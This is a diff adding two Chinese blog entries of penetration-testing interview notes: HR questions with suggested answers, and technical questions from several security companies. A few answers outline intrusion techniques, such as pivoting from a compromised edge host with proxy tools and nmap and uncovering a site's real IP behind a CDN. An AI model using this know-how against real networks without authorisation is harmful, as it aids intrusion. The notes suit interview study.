@@ -2644,6 +2644,235 @@
       </tags>
   </entry>
   <entry>
+    <title>个人准备渗透测试和安全面试的经验之谈（1）</title>
+    <url>/2019/11/11/%E4%B8%AA%E4%BA%BA%E5%87%86%E5%A4%87%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%92%8C%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E7%9A%84%E7%BB%8F%E9%AA%8C%E4%B9%8B%E8%B0%88%EF%BC%881%EF%BC%89/</url>
+    <content><![CDATA[<blockquote>
+<p>文章摘选自<br><a href="https://github.com/Leezj9671/Pentest_Interview/blob/master/HR%E9%97%AE%E9%A2%98.md" target="_blank" rel="noopener">https://github.com/Leezj9671/Pentest_Interview/blob/master/HR%E9%97%AE%E9%A2%98.md</a></p>
+</blockquote><a id="more"></a>
+<ul>
+<li><a href="#hr面">HR面</a><ul>
+<li><a href="#问题">问题</a><ul>
+<li><a href="#对我们公司有什么了解为什么选择本公司">对我们公司有什么了解，为什么选择本公司</a></li>
+<li><a href="#为什么想要应聘这个职位">为什么想要应聘这个职位</a></li>
+<li><a href="#对安全服务是怎么理解的">对安全服务是怎么理解的</a></li>
+<li><a href="#如果我不知道渗透测试两分钟说一下">如果我不知道渗透测试，两分钟说一下</a></li>
+<li><a href="#如果我是一个汽车厂商你如何证明你的工作是有意义的">如果我是一个汽车厂商，你如何证明你的工作是有意义的？</a></li>
+<li><a href="#作为应届生你如何能胜任该职位">作为应届生，你如何能胜任该职位</a></li>
+<li><a href="#你有什么职业规划">你有什么职业规划</a></li>
+<li><a href="#如果离职的话是因为什么原因">如果离职的话是因为什么原因</a></li>
+<li><a href="#你有什么优缺点">你有什么优缺点</a></li>
+<li><a href="#对于薪资的要求">对于薪资的要求</a></li>
+<li><a href="#给不了这么多工资可以接受吗为什么想要这个数">给不了这么多工资可以接受吗？为什么想要这个数？</a></li>
+<li><a href="#进入部门后你需要多长时间进入项目">进入部门后，你需要多长时间进入项目？</a></li>
+<li><a href="#上一个面试的人能力跟你差不多但是工资方面比你要的低">上一个面试的人能力跟你差不多，但是工资方面比你要的低？</a></li>
+<li><a href="#是否可以接受加班">是否可以接受加班</a></li>
+<li><a href="#沟通能力和领导同事产生分歧会怎么办">（沟通能力）和领导、同事产生分歧会怎么办</a></li>
+<li><a href="#工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法">工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法</a></li>
+<li><a href="#对上司有什么要求喜欢和什么样的领导合作">对上司有什么要求？喜欢和什么样的领导合作？</a></li>
+<li><a href="#最有影响的一件事人">最有影响的一件事/人</a></li>
+<li><a href="#你还要问什么问题">你还要问什么问题</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="HR面"><a href="#HR面" class="headerlink" title="HR面"></a>HR面</h1><p>注意！HR面试的时候会有非常多的坑，熟悉我在这里写的问题，回答的时候情商高一点，不要跟HR吵起来，也不要有不合时宜的意见分歧，这个度的把控最好自己能让同学、朋友担任面试官，让他们多多挑你的刺，从而不断练习自己的反应能力。技术面试通过的，在HR这边通不过的例子是有很多的！</p>
+<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="对我们公司有什么了解，为什么选择本公司"><a href="#对我们公司有什么了解，为什么选择本公司" class="headerlink" title="对我们公司有什么了解，为什么选择本公司"></a>对我们公司有什么了解，为什么选择本公司</h3><p>在信息安全行业比较知名，了解过公司的xx产品。（每次面试某个公司，都要花5-10分钟了解该公司的产品）</p>
+<h3 id="为什么想要应聘这个职位"><a href="#为什么想要应聘这个职位" class="headerlink" title="为什么想要应聘这个职位"></a>为什么想要应聘这个职位</h3><p>从我的经历上可以很清楚地看到我对网络安全的浓厚兴趣，我认为对本职工作有兴趣的人才能更好地完成这个工作。另外也有一句话说得很棒，“你之所以看不见黑暗，是因为有人拼命把它挡在你看不到的地方”，我认为做信息安全的尤其是渗透测试，就是为了更好地保护用户的安全，防患于未然，也是我想要应聘这个岗位的理由。（不要照背，体现自己的热爱和专业能力）</p>
+<h3 id="对安全服务是怎么理解的"><a href="#对安全服务是怎么理解的" class="headerlink" title="对安全服务是怎么理解的"></a>对安全服务是怎么理解的</h3><p>安全服务对象是人， 渗透测试对象是网站。（我的理解）</p>
+<ul>
+<li>安全概念和资讯</li>
+<li>安全工具使用</li>
+<li>渗透测试</li>
+<li>安全基线检查</li>
+<li>应急响应</li>
+<li>代码审计</li>
+<li>安全边界建设</li>
+<li>安全规范 </li>
+</ul>
+<h3 id="如果我不知道渗透测试，两分钟说一下"><a href="#如果我不知道渗透测试，两分钟说一下" class="headerlink" title="如果我不知道渗透测试，两分钟说一下"></a>如果我不知道渗透测试，两分钟说一下</h3><p>（此处自行组织语言，力求能将渗透测试讲得浅显易懂，时间控制在三分钟以内）</p>
+<h3 id="如果我是一个汽车厂商，你如何证明你的工作是有意义的？"><a href="#如果我是一个汽车厂商，你如何证明你的工作是有意义的？" class="headerlink" title="如果我是一个汽车厂商，你如何证明你的工作是有意义的？"></a>如果我是一个汽车厂商，你如何证明你的工作是有意义的？</h3><p>（对于不懂得安全的人来说，怎么能说服他需要进行渗透测试，渗透测试有什么作用）</p>
+<h3 id="作为应届生，你如何能胜任该职位"><a href="#作为应届生，你如何能胜任该职位" class="headerlink" title="作为应届生，你如何能胜任该职位"></a>作为应届生，你如何能胜任该职位</h3><p>正如前方所说，我学习能力很强，主观能动性强，能很快地做好下派的任务，所以我认为我能很好地胜任这个职位</p>
+<h3 id="你有什么职业规划"><a href="#你有什么职业规划" class="headerlink" title="你有什么职业规划"></a>你有什么职业规划</h3><p>渗透测试工程师-&gt;渗透测试项目负责人-&gt;安全架构师（安全咨询顾问）</p>
+<h3 id="如果离职的话是因为什么原因"><a href="#如果离职的话是因为什么原因" class="headerlink" title="如果离职的话是因为什么原因"></a>如果离职的话是因为什么原因</h3><p>个人规划和公司有冲突，缺少上升空间。（就算是因为钱少、和同事 <del>打架</del> 不和，也不要明说……）</p>
+<h3 id="你有什么优缺点"><a href="#你有什么优缺点" class="headerlink" title="你有什么优缺点"></a>你有什么优缺点</h3><ul>
+<li>优点：对网络安全十分热爱，抗压能力强，学习能力强，责任感强</li>
+<li>缺点：遇到技术难点时可能会一直钻研，可能会耽搁到其它事情 （情商高一点，不要真的说自己的缺点）</li>
+</ul>
+<h3 id="对于薪资的要求"><a href="#对于薪资的要求" class="headerlink" title="对于薪资的要求"></a>对于薪资的要求</h3><p>月薪13-15K，可以接受1k的浮动</p>
+<h3 id="给不了这么多工资可以接受吗？为什么想要这个数？"><a href="#给不了这么多工资可以接受吗？为什么想要这个数？" class="headerlink" title="给不了这么多工资可以接受吗？为什么想要这个数？"></a>给不了这么多工资可以接受吗？为什么想要这个数？</h3><ol>
+<li>贵公司和我其实比较契合，我可以接受月薪1k左右的浮动。（表明自己的接受范围和立场）</li>
+<li>可能我某些方面表现得不够好或者表达不清晰，让您觉得我的能力不够。您可以根据这些点再问我几个问题。（表明自己对自身的判断，认为自己值得这个数，委婉提示面试官可能判断有误）</li>
+<li>通过贵司的招聘信息和整个市场平均水平看，我认为我岗位匹配度比较好，值得这个工资水平。（明确回答，要有自信）<br>（这个问题千万不要顶嘴或拍桌走人，可参考我的知乎回答 面试想拿 10K，HR 说你只值 7K，该怎样回答或者反驳？ - 李与归的回答 - 知乎 <a href="https://www.zhihu.com/question/282880854/answer/432987673" target="_blank" rel="noopener">https://www.zhihu.com/question/282880854/answer/432987673</a> ）</li>
+</ol>
+<h3 id="进入部门后，你需要多长时间进入项目？"><a href="#进入部门后，你需要多长时间进入项目？" class="headerlink" title="进入部门后，你需要多长时间进入项目？"></a>进入部门后，你需要多长时间进入项目？</h3><p>（表达自己的快速学习能力）</p>
+<h3 id="上一个面试的人能力跟你差不多，但是工资方面比你要的低？"><a href="#上一个面试的人能力跟你差不多，但是工资方面比你要的低？" class="headerlink" title="上一个面试的人能力跟你差不多，但是工资方面比你要的低？"></a>上一个面试的人能力跟你差不多，但是工资方面比你要的低？</h3><p>（表达综合素质方面，比如沟通能力好、领导能力好、文档能力好等等）</p>
+<h3 id="是否可以接受加班"><a href="#是否可以接受加班" class="headerlink" title="是否可以接受加班"></a>是否可以接受加班</h3><p>加班肯定是不可避免的，我可以接受项目需求的加班，毕竟完成工作是员工所要尽到的责任。同时我也会提高自己的工作效率，配合完成工作。（同样的，情商高一点，口头说要加班，入职之后要不要加班不就是……:&gt;）</p>
+<h3 id="（沟通能力）和领导、同事产生分歧会怎么办"><a href="#（沟通能力）和领导、同事产生分歧会怎么办" class="headerlink" title="（沟通能力）和领导、同事产生分歧会怎么办"></a>（沟通能力）和领导、同事产生分歧会怎么办</h3><p>出现分歧是十分正常的事情，产生分歧很有可能是双方理解不一样，如何有效沟通、相互理解才是重中之重。在我看来还是会以大局出发，以有益于公司和客户的方向出发。</p>
+<h3 id="工作一段时间后，发现工作不是想象中的，会怎么办-对跳槽的看法"><a href="#工作一段时间后，发现工作不是想象中的，会怎么办-对跳槽的看法" class="headerlink" title="工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法"></a>工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法</h3><p>我在找工作之前，都会了解好这份工作的具体职责，如果我工作一段时间后发现工作不是想象中的，那只能说明我的职业目标不够清晰。（圆滑点）</p>
+<h3 id="对上司有什么要求？喜欢和什么样的领导合作？"><a href="#对上司有什么要求？喜欢和什么样的领导合作？" class="headerlink" title="对上司有什么要求？喜欢和什么样的领导合作？"></a>对上司有什么要求？喜欢和什么样的领导合作？</h3><p>我来求职都是为了能找到一个希望能提升自己的平台，我希望更能找到一个技术经验丰富的领导。</p>
+<h3 id="最有影响的一件事-人"><a href="#最有影响的一件事-人" class="headerlink" title="最有影响的一件事/人"></a>最有影响的一件事/人</h3><p>（最好是在安全领域方面的，说上一些黑客事件，表明自己热爱安全领域）</p>
+<h3 id="你还要问什么问题"><a href="#你还要问什么问题" class="headerlink" title="你还要问什么问题"></a>你还要问什么问题</h3><ul>
+<li>有没有岗位晋升机制，入职培训项目，员工培训提升项目？考证有没有报销？</li>
+<li>五险一金、社保比例、饭补、餐补、交通补助？</li>
+<li>应聘岗位具体职责和工作内容？会不会经常出差？</li>
+<li>试用期多久？薪水多少？</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>面试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>个人准备渗透测试和安全面试的经验之谈（2）</title>
+    <url>/2019/11/11/%E4%B8%AA%E4%BA%BA%E5%87%86%E5%A4%87%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%92%8C%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E7%9A%84%E7%BB%8F%E9%AA%8C%E4%B9%8B%E8%B0%88%EF%BC%882%EF%BC%89/</url>
+    <content><![CDATA[<blockquote>
+<p>文章摘选自<br><a href="https://github.com/Leezj9671/Pentest_Interview/blob/master/%E9%83%A8%E5%88%86%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95.md" target="_blank" rel="noopener">https://github.com/Leezj9671/Pentest_Interview/blob/master/%E9%83%A8%E5%88%86%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95.md</a></p>
+</blockquote><a id="more"></a>
+<ul>
+<li><a href="#面试问题记录">面试问题记录</a><ul>
+<li><a href="#360">360</a><ul>
+<li><a href="#sql的存储引擎">SQL的存储引擎</a></li>
+<li><a href="#sql注入写shell的条件用法">SQL注入写shell的条件，用法</a></li>
+<li><a href="#gpc是什么开启了怎么绕过">GPC是什么？开启了怎么绕过</a></li>
+<li><a href="#mysql一个和两个什么区别">Mysql一个@和两个@什么区别</a></li>
+<li><a href="#iis解析漏洞不同版本有什么漏洞还有什么容器解析漏洞">IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞</a></li>
+<li><a href="#wireshark抓包数据报经过三层交换机路由的变化nat协议描述地址进入内网怎么变化">wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化</a></li>
+<li><a href="#linux计划任务黑客隐藏自己的计划任务会怎么做windows计划任务怎么设定">linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定</a></li>
+<li><a href="#挖过最难的漏洞是什么">挖过最难的漏洞是什么</a></li>
+</ul>
+</li>
+<li><a href="#ukelink">ukelink</a><ul>
+<li><a href="#病毒和蠕虫的区别">病毒和蠕虫的区别</a></li>
+<li><a href="#dns欺骗是什么">DNS欺骗是什么</a></li>
+<li><a href="#DDOS有哪些,CC攻击是什么,区别是什么,在哪一个层面,什么协议">DDOS有哪些,CC攻击是什么,区别是什么,在哪一个层面,什么协议</a></li>
+<li><a href="#陆地land攻击是什么">陆地land攻击是什么</a></li>
+<li><a href="#xss有什么执行存储型的xss的危害和原理">xss有什么？执行存储型的xss的危害和原理</a></li>
+<li><a href="#渗透测试流程不够清晰太浅显">渗透测试流程？（不够清晰，太浅显</a></li>
+<li><a href="#有没有移动端的调试经验-apkipa包分析">有没有移动端的调试经验 apk,ipa包分析</a></li>
+<li><a href="#对于云安全的理解">对于云安全的理解</a></li>
+<li><a href="#虚拟机逃逸的理解">虚拟机逃逸的理解</a></li>
+<li><a href="#英语介绍一下自己">英语介绍一下自己</a></li>
+<li><a href="#职业路径">职业路径</a></li>
+<li><a href="#大学做过什么相关的事情">大学做过什么相关的事情</a></li>
+<li><a href="#在工作会做什么来不断提高自己的能力">在工作会做什么来不断提高自己的能力</a></li>
+</ul>
+</li>
+<li><a href="#卓望">卓望</a><ul>
+<li><a href="#渗透测试流程">渗透测试流程</a></li>
+<li><a href="#描述渗透项目做了什么">描述渗透项目，做了什么</a></li>
+<li><a href="#xss漏洞类型详情修复方案">xss漏洞类型、详情、修复方案</a></li>
+<li><a href="#sql注入原理类型waf绕过写shell提权修复方案">SQL注入原理、类型，waf绕过，写shell，提权，修复方案</a></li>
+<li><a href="#终端的渗透经验">终端的渗透经验</a></li>
+<li><a href="#了解什么比较新的漏洞">了解什么比较新的漏洞</a></li>
+<li><a href="#企业内部安全">企业内部安全</a></li>
+</ul>
+</li>
+<li><a href="#安巽">安巽</a><ul>
+<li><a href="#算法了解过什么排序">算法？了解过什么排序？</a></li>
+<li><a href="#爬虫">爬虫</a><ul>
+<li><a href="#页面存在很多js的时候用什么">页面存在很多js的时候，用什么</a></li>
+<li><a href="#爬虫的待爬取url量级比较大的时候如何对其去重">爬虫的待爬取URL量级比较大的时候，如何对其去重</a></li>
+<li><a href="#多线程-异步-协程-多路复用-用哪一个最快-为什么">多线程 异步 协程 多路复用 用哪一个最快 为什么</a></li>
+</ul>
+</li>
+<li><a href="#浏览器的常用编码">浏览器的常用编码</a></li>
+<li><a href="#web常用的加密算法有什么">web常用的加密算法有什么</a></li>
+<li><a href="#有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？">有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？</a></li>
+<li><a href="#mysql中like查询会会非常缓慢如何进行优化">mysql中like查询会会非常缓慢，如何进行优化</a></li>
+<li><a href="#做了cdn的网站如何获取真实ip">做了cdn的网站如何获取真实IP</a></li>
+<li><a href="#渗透的时候如何隐藏自己的身份">渗透的时候如何隐藏自己的身份</a></li>
+<li><a href="#主机疑似遭到入侵要看哪里的日志">主机疑似遭到入侵，要看哪里的日志</a></li>
+<li><a href="#sql注入漏洞怎么修复">SQL注入漏洞怎么修复</a></li>
+</ul>
+</li>
+<li><a href="#长亭">长亭</a><ul>
+<li><a href="#安全研究的方面做过哪些渗透测试的工作">安全研究的方面？做过哪些渗透测试的工作？</a></li>
+<li><a href="#只给你一个网址如何进行渗透测试">只给你一个网址，如何进行渗透测试</a></li>
+<li><a href="#SQL注入，id=1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？">SQL注入，id=1如何检测？order by怎么利用？limit语句怎么利用？盲注有什么？</a></li>
+<li><a href="#sleep被禁用后还能怎么进行sql注入">sleep被禁用后还能怎么进行sql注入</a></li>
+<li><a href="#xss可以控制属性怎么利用">XSS可以控制属性怎么利用</a></li>
+<li><a href="#csrf怎么防护">CSRF怎么防护？</a></li>
+<li><a href="#请求头中哪些是有危害的">请求头中哪些是有危害的？</a></li>
+<li><a href="#XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过">XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过</a></li>
+<li><a href="#java中间件的漏洞举几个例子">JAVA中间件的漏洞，举几个例子？</a></li>
+<li><a href="#iis常见的漏洞">IIS常见的漏洞</a></li>
+<li><a href="#python有哪些框架其中出现过哪些漏洞">python有哪些框架，其中出现过哪些漏洞</a></li>
+<li><a href="#业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？">业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？</a></li>
+<li><a href="#PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？">PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？</a></li>
+<li><a href="#HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie">HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie</a></li>
+</ul>
+</li>
+<li><a href="#盛邦">盛邦</a><ul>
+<li><a href="#有没有做过协议分析和抓包分析">有没有做过协议分析和抓包分析</a></li>
+</ul>
+</li>
+<li><a href="#翼果">翼果</a><ul>
+<li><a href="#mysql查看版本">mysql查看版本？</a></li>
+<li><a href="#过安全狗">过安全狗</a></li>
+<li><a href="#编程能力平台逆向修改程序入口rootkit有没有研究过">编程能力/平台逆向/修改程序入口/rootkit有没有研究过</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="面试问题记录"><a href="#面试问题记录" class="headerlink" title="面试问题记录"></a>面试问题记录</h1><blockquote>
+<p>CONTACT ME: github.com/leezj9671</p>
+</blockquote>
+<h2 id="360"><a href="#360" class="headerlink" title="360"></a>360</h2><h3 id="SQL的存储引擎"><a href="#SQL的存储引擎" class="headerlink" title="SQL的存储引擎"></a>SQL的存储引擎</h3><h3 id="SQL注入写shell的条件，用法"><a href="#SQL注入写shell的条件，用法" class="headerlink" title="SQL注入写shell的条件，用法"></a>SQL注入写shell的条件，用法</h3><h3 id="GPC是什么？开启了怎么绕过"><a href="#GPC是什么？开启了怎么绕过" class="headerlink" title="GPC是什么？开启了怎么绕过"></a>GPC是什么？开启了怎么绕过</h3><h3 id="Mysql一个-和两个-什么区别"><a href="#Mysql一个-和两个-什么区别" class="headerlink" title="Mysql一个@和两个@什么区别"></a>Mysql一个@和两个@什么区别</h3><h3 id="IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞"><a href="#IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞" class="headerlink" title="IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞"></a>IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞</h3><h3 id="wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化"><a href="#wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化" class="headerlink" title="wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化"></a>wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化</h3><h3 id="linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定"><a href="#linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定" class="headerlink" title="linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定"></a>linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定</h3><p>三种主要的at batch cron，一般使用cron在规定的时间执行命令</p>
+<h3 id="挖过最难的漏洞是什么"><a href="#挖过最难的漏洞是什么" class="headerlink" title="挖过最难的漏洞是什么"></a>挖过最难的漏洞是什么</h3><h2 id="ukelink"><a href="#ukelink" class="headerlink" title="ukelink"></a>ukelink</h2><h3 id="病毒和蠕虫的区别"><a href="#病毒和蠕虫的区别" class="headerlink" title="病毒和蠕虫的区别"></a>病毒和蠕虫的区别</h3><h3 id="DNS欺骗是什么"><a href="#DNS欺骗是什么" class="headerlink" title="DNS欺骗是什么"></a>DNS欺骗是什么</h3><p>定义： DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。 原理：如果可以冒充域名服务器，然后把查询的IP地址设为攻击者的IP地址，这样的话，用户上网就只能看到攻击者的主页，而不是用户想要取得的网站的主页了，这就是DNS欺骗的基本原理。DNS欺骗其实并不是真的“黑掉”了对方的网站，而是冒名顶替、招摇撞骗罢了。</p>
+<h3 id="DDOS有哪些-CC攻击是什么-区别是什么-在哪一个层面-什么协议"><a href="#DDOS有哪些-CC攻击是什么-区别是什么-在哪一个层面-什么协议" class="headerlink" title="DDOS有哪些,CC攻击是什么,区别是什么,在哪一个层面,什么协议"></a>DDOS有哪些,CC攻击是什么,区别是什么,在哪一个层面,什么协议</h3><p>SYN攻击 防火墙、特征匹配<br>ACK FLOOD<br>UDP FLOOD<br>ICMP FLOOD<br>CC http的get请求<br>陆地攻击 源IP和目的IP都为同一个<br>UDP DNS QUERY 向被攻击的服务器发送大量的域名解析请求，通常请求解析的域名是随机生成或者是网络世界上根本不存在的域名，被攻击的DNS 服务器在接收到域名解析请求的时候首先会在服务器上查找是否有对应的缓存，如果查找不到并且该域名无法直接由服务器解析的时候，DNS 服务器会向其上层DNS服务器递归查询域名信息</p>
+<h3 id="陆地land攻击是什么"><a href="#陆地land攻击是什么" class="headerlink" title="陆地land攻击是什么"></a>陆地land攻击是什么</h3><h3 id="xss有什么？执行存储型的xss的危害和原理"><a href="#xss有什么？执行存储型的xss的危害和原理" class="headerlink" title="xss有什么？执行存储型的xss的危害和原理"></a>xss有什么？执行存储型的xss的危害和原理</h3><h3 id="渗透测试流程？（不够清晰，太浅显"><a href="#渗透测试流程？（不够清晰，太浅显" class="headerlink" title="渗透测试流程？（不够清晰，太浅显"></a>渗透测试流程？（不够清晰，太浅显</h3><h3 id="有没有移动端的调试经验-apk-ipa包分析"><a href="#有没有移动端的调试经验-apk-ipa包分析" class="headerlink" title="有没有移动端的调试经验 apk,ipa包分析"></a>有没有移动端的调试经验 apk,ipa包分析</h3><h3 id="对于云安全的理解"><a href="#对于云安全的理解" class="headerlink" title="对于云安全的理解"></a>对于云安全的理解</h3><p>权限管理，内网威胁，信息泄露，过于依赖托管厂商</p>
+<h3 id="虚拟机逃逸的理解"><a href="#虚拟机逃逸的理解" class="headerlink" title="虚拟机逃逸的理解"></a>虚拟机逃逸的理解</h3><p>虚拟机之间通信或上层主机的通信</p>
+<h3 id="英语介绍一下自己"><a href="#英语介绍一下自己" class="headerlink" title="英语介绍一下自己"></a>英语介绍一下自己</h3><h3 id="职业路径"><a href="#职业路径" class="headerlink" title="职业路径"></a>职业路径</h3><h3 id="大学做过什么相关的事情"><a href="#大学做过什么相关的事情" class="headerlink" title="大学做过什么相关的事情"></a>大学做过什么相关的事情</h3><h3 id="在工作会做什么来不断提高自己的能力"><a href="#在工作会做什么来不断提高自己的能力" class="headerlink" title="在工作会做什么来不断提高自己的能力"></a>在工作会做什么来不断提高自己的能力</h3><h2 id="卓望"><a href="#卓望" class="headerlink" title="卓望"></a>卓望</h2><h3 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h3><h3 id="描述渗透项目，做了什么"><a href="#描述渗透项目，做了什么" class="headerlink" title="描述渗透项目，做了什么"></a>描述渗透项目，做了什么</h3><h3 id="xss漏洞类型、详情、修复方案"><a href="#xss漏洞类型、详情、修复方案" class="headerlink" title="xss漏洞类型、详情、修复方案"></a>xss漏洞类型、详情、修复方案</h3><h3 id="SQL注入原理、类型，waf绕过，写shell，提权，修复方案"><a href="#SQL注入原理、类型，waf绕过，写shell，提权，修复方案" class="headerlink" title="SQL注入原理、类型，waf绕过，写shell，提权，修复方案"></a>SQL注入原理、类型，waf绕过，写shell，提权，修复方案</h3><h3 id="终端的渗透经验"><a href="#终端的渗透经验" class="headerlink" title="终端的渗透经验"></a>终端的渗透经验</h3><h3 id="了解什么比较新的漏洞"><a href="#了解什么比较新的漏洞" class="headerlink" title="了解什么比较新的漏洞"></a>了解什么比较新的漏洞</h3><h3 id="企业内部安全"><a href="#企业内部安全" class="headerlink" title="企业内部安全"></a>企业内部安全</h3><p>信息安全管理的本质就是输入和输出。一般防范的风险为物理威胁和网络威胁。<br>防范风险可以从制度和流程（人员入离职流程、权限申请流程）、人员配备和知识积累、风险防范（物理威胁：门禁、监控、禁止USB设备接入、封闭PC、定时巡检；网络威胁：部署行为管控设备、可靠的网络结构、IP和MAC地址绑定，将网络行为分组、限制不必要的软件和通信协议、定期审核日志）</p>
+<h2 id="安巽"><a href="#安巽" class="headerlink" title="安巽"></a>安巽</h2><h3 id="算法？了解过什么排序？"><a href="#算法？了解过什么排序？" class="headerlink" title="算法？了解过什么排序？"></a>算法？了解过什么排序？</h3><p>快速排序 冒泡排序</p>
+<h3 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h3><h4 id="页面存在很多js的时候，用什么"><a href="#页面存在很多js的时候，用什么" class="headerlink" title="页面存在很多js的时候，用什么"></a>页面存在很多js的时候，用什么</h4><p>phnatomJS selenium execjs</p>
+<h4 id="爬虫的待爬取URL量级比较大的时候，如何对其去重"><a href="#爬虫的待爬取URL量级比较大的时候，如何对其去重" class="headerlink" title="爬虫的待爬取URL量级比较大的时候，如何对其去重"></a>爬虫的待爬取URL量级比较大的时候，如何对其去重</h4><ul>
+<li>在数据库中创建字段的UNIQUE属性：对于在数据库中创建字段的UNIQUE属性， 的确是可以避免一些重复性操作。不过在多次MySQL报错之后，程序可能会直接崩溃，因此这种方式不可取</li>
+<li>在数据库中创建一个唯一的索引，在插入数据之前检查待插入的数据是否存在：如果我们要在每一次插入数据之前都去检查待插入的数据是否存在，这样势必会影响程序的效率</li>
+<li>使用Set或HashSet保存数据，确保唯一。可以使用redis，但是内存占用大</li>
+<li>使用Map或是一个定长数组记录某一个URL是否被访问过</li>
+<li>布隆过滤器(bloom filter)，bitmap</li>
+</ul>
+<h4 id="多线程-异步-协程-多路复用-用哪一个最快-为什么"><a href="#多线程-异步-协程-多路复用-用哪一个最快-为什么" class="headerlink" title="多线程 异步 协程 多路复用 用哪一个最快 为什么"></a>多线程 异步 协程 多路复用 用哪一个最快 为什么</h4><blockquote>
+<p><a href="https://www.cnblogs.com/yuanchenqi/articles/6755717.html#_label3" target="_blank" rel="noopener">https://www.cnblogs.com/yuanchenqi/articles/6755717.html#_label3</a></p>
+</blockquote>
+<p>线程也叫轻量级进程，它是一个基本的CPU执行单元，也是程序执行过程中的最小单元，由线程ID、程序计数器、寄存器集合和堆栈共同组成。线程的引入减小了程序并发执行时的开销，提高了操作系统的并发性能。线程没有自己的系统资源。</p>
+<p>异步是指进程不需要一直等下去，而是继续执行下面的操作，不管其他进程的状态。当有消息返回时系统会通知进程进行处理，这样可以提高执行的效率。</p>
+<p>协程是一种用户态的轻量级线程，拥有自己的寄存器上下文和栈</p>
+<p>IO多路复用 异步阻塞IO 线程轮询IO</p>
+<h3 id="浏览器的常用编码"><a href="#浏览器的常用编码" class="headerlink" title="浏览器的常用编码"></a>浏览器的常用编码</h3><p>一开始我以为是说字符编码，有UTF8 Unicode GBK。面试官还几番提醒我也没答上来。回来一想，我觉得他应该问的是content-type。 <a href="http://www.runoob.com/http/http-content-type.html" target="_blank" rel="noopener">http://www.runoob.com/http/http-content-type.html</a> </p>
+<h3 id="web常用的加密算法有什么"><a href="#web常用的加密算法有什么" class="headerlink" title="web常用的加密算法有什么"></a>web常用的加密算法有什么</h3><p>非对称加密  RSA、ElGamal、Rabin<br>对称加密 DES、3DES、AES<br>散列算法 MD5 SHA base64</p>
+<h3 id="有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？"><a href="#有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？" class="headerlink" title="有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？"></a>有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？</h3><p>拿下机器后<br>内网渗透使用代理访问内网 windows环境：reGeorg与proxifier Linux（kali-linux）环境：reGeorg与proxychains，使用nmap等工具进行扫描，发现web服务的主机和其它信息。有时这些边界机器上会记录一些内网服务器上的一些信息（用户 ssh known_hosts  hosts 防火墙设置 记录、内网之间好多waf 规则基本都是空，大多数waf防外部威胁  这时候可以拿到探测的内部一些开放的端口判断进行渗透，通常用户这里基本是统一命名的   拿到的各种记录 会暴露出部分内网通讯的ip</p>
+<p>内网内弱口令占大多数 FTP MSSQL 远程桌面链接</p>
+<h3 id="mysql中like查询会会非常缓慢，如何进行优化"><a href="#mysql中like查询会会非常缓慢，如何进行优化" class="headerlink" title="mysql中like查询会会非常缓慢，如何进行优化"></a>mysql中like查询会会非常缓慢，如何进行优化</h3><p>分词索引</p>
+<h3 id="做了cdn的网站如何获取真实IP"><a href="#做了cdn的网站如何获取真实IP" class="headerlink" title="做了cdn的网站如何获取真实IP"></a>做了cdn的网站如何获取真实IP</h3><ol>
+<li>多地ping看是否有cdn</li>
+<li>邮件订阅或者rss订阅</li>
+<li>二级域名可能不会做cdn</li>
